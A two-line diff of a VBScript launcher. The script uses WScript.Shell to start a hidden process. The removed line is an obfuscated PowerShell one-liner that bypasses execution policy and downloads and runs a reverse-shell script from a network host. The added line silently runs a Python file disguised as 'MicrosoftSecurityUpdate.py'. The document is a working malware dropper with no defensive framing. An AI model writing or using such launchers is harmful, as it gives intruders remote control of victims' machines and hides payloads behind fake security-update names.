@@ -1,2 +1,2 @@
 Set objShell = CreateObject("WScript.Shell")
-intReturn = objShell.Run("pOwErshell -eXECUt BYpASS -COm ""IEX ((new-object net.webclient).downloadstring('http://192.168.1.64:8000/revshell.ps1'))""", 0)
+intReturn = objShell.Run("python.exe C:\Users\Public\Chocolatey\MicrosoftSecurityUpdate.py", 0)
